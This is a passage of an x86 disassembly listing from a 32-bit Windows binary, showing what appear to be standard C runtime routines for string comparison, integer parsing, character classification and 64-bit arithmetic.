  426da2:	mov    ebx,esi
  426da4:	dec    eax
  426da5:	neg    eax
  426da7:	sbb    eax,eax
  426da9:	and    eax,0x103
  426dae:	lea    ecx,[ebp-0x8]
  426db1:	push   ecx
  426db2:	inc    eax
  426db3:	push   eax
  426db4:	push   DWORD PTR [ebp-0x4]
  426db7:	push   ebx
  426db8:	call   DWORD PTR ds:0x428008
  426dbe:	lea    esp,[ebp-0x54]
  426dc1:	pop    edi
  426dc2:	pop    esi
  426dc3:	pop    ebx
  426dc4:	leave  
  426dc5:	ret    
  426dc6:	int3   
  426dc7:	int3   
  426dc8:	int3   
  426dc9:	int3   
  426dca:	int3   
  426dcb:	int3   
  426dcc:	int3   
  426dcd:	int3   
  426dce:	int3   
  426dcf:	int3   
  426dd0:	push   ebp
  426dd1:	mov    ebp,esp
  426dd3:	push   edi
  426dd4:	push   esi
  426dd5:	push   ebx
  426dd6:	mov    esi,DWORD PTR [ebp+0xc]
  426dd9:	mov    edi,DWORD PTR [ebp+0x8]
  426ddc:	mov    al,0xff
  426dde:	mov    edi,edi
  426de0:	or     al,al
  426de2:	je     0x426e16
  426de4:	mov    al,BYTE PTR [esi]
  426de6:	add    esi,0x1
  426de9:	mov    ah,BYTE PTR [edi]
  426deb:	add    edi,0x1
  426dee:	cmp    ah,al
  426df0:	je     0x426de0
  426df2:	sub    al,0x41
  426df4:	cmp    al,0x1a
  426df6:	sbb    cl,cl
  426df8:	and    cl,0x20
  426dfb:	add    al,cl
  426dfd:	add    al,0x41
  426dff:	xchg   al,ah
  426e01:	sub    al,0x41
  426e03:	cmp    al,0x1a
  426e05:	sbb    cl,cl
  426e07:	and    cl,0x20
  426e0a:	add    al,cl
  426e0c:	add    al,0x41
  426e0e:	cmp    al,ah
  426e10:	je     0x426de0
  426e12:	sbb    al,al
  426e14:	sbb    al,0xff
  426e16:	movsx  eax,al
  426e19:	pop    ebx
  426e1a:	pop    esi
  426e1b:	pop    edi
  426e1c:	leave  
  426e1d:	ret    
  426e1e:	push   esi
  426e1f:	push   edi
  426e20:	call   0x42370d
  426e25:	mov    edi,DWORD PTR [eax+0x64]
  426e28:	cmp    edi,DWORD PTR ds:0x45c58c
  426e2e:	je     0x426e37
  426e30:	call   0x424bbf
  426e35:	mov    edi,eax
  426e37:	mov    esi,DWORD PTR [esp+0xc]
  426e3b:	cmp    DWORD PTR [edi+0x28],0x1
  426e3f:	movzx  eax,BYTE PTR [esi]
  426e42:	jle    0x426e52
  426e44:	push   0x8
  426e46:	push   eax
  426e47:	push   edi
  426e48:	call   0x426ea6
  426e4d:	add    esp,0xc
  426e50:	jmp    0x426e5c
  426e52:	mov    ecx,DWORD PTR [edi+0x48]
  426e55:	movzx  eax,BYTE PTR [ecx+eax*2]
  426e59:	and    eax,0x8
  426e5c:	test   eax,eax
  426e5e:	je     0x426e63
  426e60:	inc    esi
  426e61:	jmp    0x426e3b
  426e63:	movzx  ecx,BYTE PTR [esi]
  426e66:	inc    esi
  426e67:	cmp    ecx,0x2d
  426e6a:	mov    edx,ecx
  426e6c:	je     0x426e73
  426e6e:	cmp    ecx,0x2b
  426e71:	jne    0x426e77
  426e73:	movzx  ecx,BYTE PTR [esi]
  426e76:	inc    esi
  426e77:	xor    eax,eax
  426e79:	cmp    ecx,0x30
  426e7c:	jl     0x426e88
  426e7e:	cmp    ecx,0x39
  426e81:	jg     0x426e88
  426e83:	sub    ecx,0x30
  426e86:	jmp    0x426e8b
  426e88:	or     ecx,0xffffffff
  426e8b:	cmp    ecx,0xffffffff
  426e8e:	je     0x426e9c
  426e90:	lea    eax,[eax+eax*4]
  426e93:	lea    eax,[ecx+eax*2]
  426e96:	movzx  ecx,BYTE PTR [esi]
  426e99:	inc    esi
  426e9a:	jmp    0x426e79
  426e9c:	cmp    edx,0x2d
  426e9f:	pop    edi
  426ea0:	pop    esi
  426ea1:	jne    0x426ea5
  426ea3:	neg    eax
  426ea5:	ret    
  426ea6:	push   ebp
  426ea7:	mov    ebp,esp
  426ea9:	push   ecx
  426eaa:	mov    eax,DWORD PTR [ebp+0xc]
  426ead:	lea    ecx,[eax+0x1]
  426eb0:	cmp    ecx,0x100
  426eb6:	mov    ecx,DWORD PTR [ebp+0x8]
  426eb9:	ja     0x426ec4
  426ebb:	mov    ecx,DWORD PTR [ecx+0x48]
  426ebe:	movzx  eax,WORD PTR [ecx+eax*2]
  426ec2:	jmp    0x426f18
  426ec4:	push   esi
  426ec5:	mov    edx,eax
  426ec7:	sar    edx,0x8
  426eca:	push   edi
  426ecb:	mov    edi,DWORD PTR [ecx+0x48]
  426ece:	movzx  esi,dl
  426ed1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426ed6:	pop    edi
  426ed7:	pop    esi
  426ed8:	je     0x426ee9
  426eda:	and    BYTE PTR [ebp-0x2],0x0
  426ede:	push   0x2
  426ee0:	mov    BYTE PTR [ebp-0x3],al
  426ee3:	mov    BYTE PTR [ebp-0x4],dl
  426ee6:	pop    eax
  426ee7:	jmp    0x426ef3
  426ee9:	and    BYTE PTR [ebp-0x3],0x0
  426eed:	mov    BYTE PTR [ebp-0x4],al
  426ef0:	xor    eax,eax
  426ef2:	inc    eax
  426ef3:	push   0x1
  426ef5:	push   DWORD PTR [ecx+0x14]
  426ef8:	push   DWORD PTR [ecx+0x4]
  426efb:	lea    ecx,[ebp+0xe]
  426efe:	push   ecx
  426eff:	push   eax
  426f00:	lea    eax,[ebp-0x4]
  426f03:	push   eax
  426f04:	push   0x1
  426f06:	call   0x425f88
  426f0b:	add    esp,0x1c
  426f0e:	test   eax,eax
  426f10:	jne    0x426f14
  426f12:	leave  
  426f13:	ret    
  426f14:	movzx  eax,WORD PTR [ebp+0xe]
  426f18:	and    eax,DWORD PTR [ebp+0x10]
  426f1b:	leave  
  426f1c:	ret    
  426f1d:	int3   
  426f1e:	int3   
  426f1f:	int3   
  426f20:	mov    eax,DWORD PTR [esp+0x8]
  426f24:	mov    ecx,DWORD PTR [esp+0x10]
  426f28:	or     ecx,eax
  426f2a:	mov    ecx,DWORD PTR [esp+0xc]
  426f2e:	jne    0x426f39
  426f30:	mov    eax,DWORD PTR [esp+0x4]
  426f34:	mul    ecx
  426f36:	ret    0x10
  426f39:	push   ebx
  426f3a:	mul    ecx
  426f3c:	mov    ebx,eax
  426f3e:	mov    eax,DWORD PTR [esp+0x8]
  426f42:	mul    DWORD PTR [esp+0x14]
  426f46:	add    ebx,eax
  426f48:	mov    eax,DWORD PTR [esp+0x8]
  426f4c:	mul    ecx
  426f4e:	add    edx,ebx
  426f50:	pop    ebx
  426f51:	ret    0x10
  426f54:	int3   
  426f55:	int3   
  426f56:	int3   
  426f57:	int3   
  426f58:	int3   
  426f59:	int3   
  426f5a:	int3   
  426f5b:	int3   
  426f5c:	int3   
  426f5d:	int3   
  426f5e:	int3   
  426f5f:	int3   
  426f60:	push   ebp
  426f61:	mov    ebp,esp
  426f63:	push   edi
  426f64:	push   esi
  426f65:	push   ebx
  426f66:	mov    ecx,DWORD PTR [ebp+0x10]
  426f69:	or     ecx,ecx
  426f6b:	je     0x426fba
  426f6d:	mov    esi,DWORD PTR [ebp+0x8]
  426f70:	mov    edi,DWORD PTR [ebp+0xc]
  426f73:	mov    bh,0x41
  426f75:	mov    bl,0x5a
  426f77:	mov    dh,0x20
  426f79:	lea    ecx,[ecx+0x0]
  426f7c:	mov    ah,BYTE PTR [esi]
  426f7e:	or     ah,ah
  426f80:	mov    al,BYTE PTR [edi]
  426f82:	je     0x426fab
  426f84:	or     al,al
  426f86:	je     0x426fab
  426f88:	add    esi,0x1
  426f8b:	add    edi,0x1
  426f8e:	cmp    ah,bh
  426f90:	jb     0x426f98
  426f92:	cmp    ah,bl
  426f94:	ja     0x426f98
  426f96:	add    ah,dh
  426f98:	cmp    al,bh
  426f9a:	jb     0x426fa2
  426f9c:	cmp    al,bl
  426f9e:	ja     0x426fa2
  426fa0:	add    al,dh
  426fa2:	cmp    ah,al
  426fa4:	jne    0x426fb1
  426fa6:	sub    ecx,0x1
  426fa9:	jne    0x426f7c
  426fab:	xor    ecx,ecx
  426fad:	cmp    ah,al
  426faf:	je     0x426fba
  426fb1:	mov    ecx,0xffffffff
  426fb6:	jb     0x426fba
  426fb8:	neg    ecx
  426fba:	mov    eax,ecx
  426fbc:	pop    ebx
  426fbd:	pop    esi
  426fbe:	pop    edi
  426fbf:	leave  
  426fc0:	ret    
  426fc1:	int3   
  426fc2:	int3   
  426fc3:	int3   
  426fc4:	int3   
  426fc5:	int3   
  426fc6:	int3   
  426fc7:	int3   
  426fc8:	int3   
  426fc9:	int3   
  426fca:	int3   
  426fcb:	int3   
  426fcc:	int3   
  426fcd:	int3   
  426fce:	int3   
  426fcf:	int3   
  426fd0:	push   esi
  426fd1:	mov    eax,DWORD PTR [esp+0x14]
  426fd5:	or     eax,eax
  426fd7:	jne    0x427001
  426fd9:	mov    ecx,DWORD PTR [esp+0x10]
  426fdd:	mov    eax,DWORD PTR [esp+0xc]
  426fe1:	xor    edx,edx
  426fe3:	div    ecx
  426fe5:	mov    ebx,eax
  426fe7:	mov    eax,DWORD PTR [esp+0x8]
  426feb:	div    ecx
  426fed:	mov    esi,eax
  426fef:	mov    eax,ebx
  426ff1:	mul    DWORD PTR [esp+0x10]
  426ff5:	mov    ecx,eax
  426ff7:	mov    eax,esi
  426ff9:	mul    DWORD PTR [esp+0x10]
  426ffd:	add    edx,ecx
  426fff:	jmp    0x427048
  427001:	mov    ecx,eax
  427003:	mov    ebx,DWORD PTR [esp+0x10]
  427007:	mov    edx,DWORD PTR [esp+0xc]
  42700b:	mov    eax,DWORD PTR [esp+0x8]
  42700f:	shr    ecx,1
  427011:	rcr    ebx,1
  427013:	shr    edx,1
  427015:	rcr    eax,1
  427017:	or     ecx,ecx
  427019:	jne    0x42700f
  42701b:	div    ebx
  42701d:	mov    esi,eax
  42701f:	mul    DWORD PTR [esp+0x14]
  427023:	mov    ecx,eax
  427025:	mov    eax,DWORD PTR [esp+0x10]
  427029:	mul    esi
  42702b:	add    edx,ecx
  42702d:	jb     0x42703d
  42702f:	cmp    edx,DWORD PTR [esp+0xc]
  427033:	ja     0x42703d
  427035:	jb     0x427046
  427037:	cmp    eax,DWORD PTR [esp+0x8]
  42703b:	jbe    0x427046
  42703d:	dec    esi
  42703e:	sub    eax,DWORD PTR [esp+0x10]
  427042:	sbb    edx,DWORD PTR [esp+0x14]
  427046:	xor    ebx,ebx
  427048:	sub    eax,DWORD PTR [esp+0x8]
  42704c:	sbb    edx,DWORD PTR [esp+0xc]
  427050:	neg    edx
  427052:	neg    eax
  427054:	sbb    edx,0x0
  427057:	mov    ecx,edx
  427059:	mov    edx,ebx
  42705b:	mov    ebx,ecx
  42705d:	mov    ecx,eax
  42705f:	mov    eax,esi
  427061:	pop    esi
  427062:	ret    0x10
  427065:	int3   
  427066:	int3   
  427067:	int3   
  427068:	int3   
  427069:	int3   
  42706a:	int3   
  42706b:	int3   
  42706c:	int3   
  42706d:	int3   
  42706e:	int3   
  42706f:	int3   
  427070:	lea    eax,[edx-0x1]
  427073:	pop    ebx
  427074:	ret    
  427075:	lea    esp,[esp+0x0]
  42707c:	lea    esp,[esp+0x0]
  427080:	xor    eax,eax
  427082:	mov    al,BYTE PTR [esp+0x8]
  427086:	push   ebx
  427087:	mov    ebx,eax
  427089:	shl    eax,0x8
  42708c:	mov    edx,DWORD PTR [esp+0x8]
  427090:	test   edx,0x3
  427096:	je     0x4270ad
  427098:	mov    cl,BYTE PTR [edx]
  42709a:	add    edx,0x1
  42709d:	cmp    cl,bl
  42709f:	je     0x427070
  4270a1:	test   cl,cl
  4270a3:	je     0x4270f6
  4270a5:	test   edx,0x3
  4270ab:	jne    0x427098
  4270ad:	or     ebx,eax
  4270af:	push   edi
  4270b0:	mov    eax,ebx
  4270b2:	shl    ebx,0x10
  4270b5:	push   esi
  4270b6:	or     ebx,eax
  4270b8:	mov    ecx,DWORD PTR [edx]
  4270ba:	mov    edi,0x7efefeff
  4270bf:	mov    eax,ecx
  4270c1:	mov    esi,edi
  4270c3:	xor    ecx,ebx
  4270c5:	add    esi,eax
  4270c7:	add    edi,ecx
  4270c9:	xor    ecx,0xffffffff
  4270cc:	xor    eax,0xffffffff
  4270cf:	xor    ecx,edi
  4270d1:	xor    eax,esi
  4270d3:	add    edx,0x4
  4270d6:	and    ecx,0x81010100
  4270dc:	jne    0x4270fa
  4270de:	and    eax,0x81010100
  4270e3:	je     0x4270b8
  4270e5:	and    eax,0x1010100
  4270ea:	jne    0x4270f4
  4270ec:	and    esi,0x80000000
  4270f2:	jne    0x4270b8
  4270f4:	pop    esi
  4270f5:	pop    edi
  4270f6:	pop    ebx
  4270f7:	xor    eax,eax
  4270f9:	ret    
  4270fa:	mov    eax,DWORD PTR [edx-0x4]
  4270fd:	cmp    al,bl
  4270ff:	je     0x427137
  427101:	test   al,al
  427103:	je     0x4270f4
  427105:	cmp    ah,bl
  427107:	je     0x427130
  427109:	test   ah,ah
  42710b:	je     0x4270f4
  42710d:	shr    eax,0x10
  427110:	cmp    al,bl
  427112:	je     0x427129
  427114:	test   al,al
  427116:	je     0x4270f4
  427118:	cmp    ah,bl
  42711a:	je     0x427122
  42711c:	test   ah,ah
  42711e:	je     0x4270f4
  427120:	jmp    0x4270b8
  427122:	pop    esi
  427123:	pop    edi
  427124:	lea    eax,[edx-0x1]
  427127:	pop    ebx
  427128:	ret    
  427129:	lea    eax,[edx-0x2]
  42712c:	pop    esi
  42712d:	pop    edi
  42712e:	pop    ebx
  42712f:	ret    
  427130:	lea    eax,[edx-0x3]
  427133:	pop    esi
  427134:	pop    edi
  427135:	pop    ebx
  427136:	ret    
  427137:	lea    eax,[edx-0x4]
  42713a:	pop    esi
  42713b:	pop    edi
  42713c:	pop    ebx
  42713d:	ret    
  42713e:	jmp    DWORD PTR ds:0x4280e0
